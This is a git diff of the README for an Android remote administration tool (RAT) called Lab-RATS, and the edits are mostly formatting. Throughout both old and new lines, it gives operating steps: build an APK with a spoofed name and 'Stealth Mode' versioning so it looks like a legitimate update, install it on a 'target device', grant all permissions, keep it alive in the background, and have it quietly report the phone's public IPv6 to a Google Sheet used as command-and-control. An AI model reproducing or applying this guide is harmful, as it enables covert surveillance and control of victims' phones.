@@ -2,13 +2,13 @@
 
 ## About
 
-**Powerful** and **lightweight Android Remote Administration Tool** *(RAT)* developed by **K4N3CO.LABS**. This tool allows for **remote monitoring and management** of Android devices through a **web-based interface**.
+**Lab-RATS** is a **Powerful** and **lightweight Android Remote Administration Tool** *(RAT)* developed by **K4N3CO.LABS**. This tool allows for **remote monitoring and management** of Android devices through a user friendly **web-based interface** and works on the newest updated 2026 Android software. *(SDK 36)*
 
 ---
 
 ## 🚀 New Features
 
-- **Signed & Unsigned APKs**: Automatically generates both `signed.apk` (for release) and `unsigned.apk`.
+- **Signed & Unsigned APKs**: Automatically generates both `signed.apk` *(for release)* and `unsigned.apk`.
 - **Advanced Identity**: Customize **App Name, Package Name** *(ID)*, and **Min SDK**.
 - **Stealth Mode**: Randomly **generates Version Name** and **Version Code** to look like **legitimate updates**.
 - **Smart Logo**:
@@ -51,10 +51,10 @@ During **security research**, a **fascinating** behavior in **modern Android net
 
 ### How Lab-RATS Exploits This:
 
-1.  **Local HTTP Server**: The app starts a **lightweight HTTP server** on the Android device (Port 8080).
-2.  **The IPv6 Feature/Bug**: Because the device has a Public IPv6, **you can access this server directly from anywhere in the world** just by typing the IP address in your browser. **No router config, no firewall bypass, no NGROK**.
+1.  **Local HTTP Server**: The app starts a **lightweight HTTP server** on the Android device *(Port 8080)*.
+2.  **The IPv6 Feature/Bug**: Because the device has a Public IPv6, **you can access this server directly from anywhere in the world** just by typing the **IP address** into your browser. (**No router config, no firewall bypass, no NGROK**)
 3.  **The Problem** *(Dynamic IPs)*: **Mobile** networks **rotate IPs frequently**. Your **target's IP changes** every time they **reconnect**.
-4.  **The Solution** *(Google Sheet)*: We use a **simple Google Sheet** as a **"Command & Control" (C2)** tracker. The app **detects** its own **Public IPv6** and **quietly posts** it to your Google Sheet. You **open the sheet**, click the **link**, and you are connected **directly to the device**.
+4.  **The Solution** *(Google Sheets)*: We use a **simple Google Sheet** as a **"Command & Control" (C2)** tracker. The app **detects** its own **Public IPv6** and **quietly posts** it to your **Google Sheet.** You **open the sheet**, click the **link**, and you are connected **directly to the device**.
 
 > `**We turn the Android phone into a public web server and use Google Sheets as a dynamic phonebook to find it.**`.
 
@@ -70,21 +70,21 @@ During **security research**, a **fascinating** behavior in **modern Android net
 ### 2. Building the APK
 1.  **Download** & **extract** the zip file.
 2.  **Navigate** to the `k4n3co-builder/` directory.
-3.  **Run** the builder script:
+3.  **Run** the builder **script**:
     -   **Windows**: Double-click `build.bat`
     -   **Linux/Mac**: `chmod +x build.sh` then `./build.sh`
-4.  **Follow** the prompts to configure:
-    -   **Pick** Number 1 to build `.apk`
-    -   **App Name**: (Default: Lab-RATS)
-    -   **Package Name**: (Default: com.labs.k4n3co)
-    -   **Google Sheet URL**: Paste your Apps Script Web App URL *(Google Sheet set-up instructions below)*.
-5.  The **final APK** will be generated in `k4n3co-builder/output/`.
+4.  **Follow** the prompts to **configure**:
+    -   **Pick** Number 1 to **build the APK**
+    -   **App Name**: *(Default: Lab-RATS)*
+    -   **Package Name**: *(Default: com.labs.k4n3co)*
+    -   **Google Sheet URL**: Paste in your **Apps Script Web App URL** *(Google Sheet set-up instructions below)*.
+5.  The **final APK** will be **generated** in `k4n3co-builder/output/`.
 
 ### 3. Usage
-1.  **Install** the generated APK on the **target device**.
+1.  **Install** the **generated APK** onto the **target device**.
 2.  **Open the app** and **grant all** requested **permissions**.
-3.  Click **"Disable Battery Optimization"** to ensure background **persistence**.
-4.  Click **"Start Server"**.
+3.  Click **"BYPASS_POWER_LIMITS"** to ensure background **persistence**.
+4.  Click **"Initialize Server"**.
 5.  The **device IP** will appear in your **Google Sheet**. Open the link to **access the control panel**.
 
 ---
@@ -93,7 +93,7 @@ During **security research**, a **fascinating** behavior in **modern Android net
 
 1. Create **Google Sheet**
 2. **Extensions** → **Apps Script**
-3. **Paste** this code:
+3. **Paste** this code in:
 
 ```javascript
 // Lab-RATS Remote Reporting Script
@@ -126,7 +126,7 @@ function setupSheet() {
 }
 ```
 4. **Deploy** → **Web App** → **Anyone**
-5. **Copy URL** → **Paste** into **builder** when asked.
+5. **Copy URL** → **Paste** into **APK builder** when asked.
 
 ---
 
@@ -136,7 +136,7 @@ If you find **Lab-RATS** useful, **please** consider giving the project a **Star
 
 **Feel free** to **open issues** or **submit pull requests**. **Contributions** are **always welcome**!
 
-**Donations (optional but greatly appreciated):**
+**Donations** *(optional but greatly appreciated)*
 
 **Bitcoin: (BTC)**
 
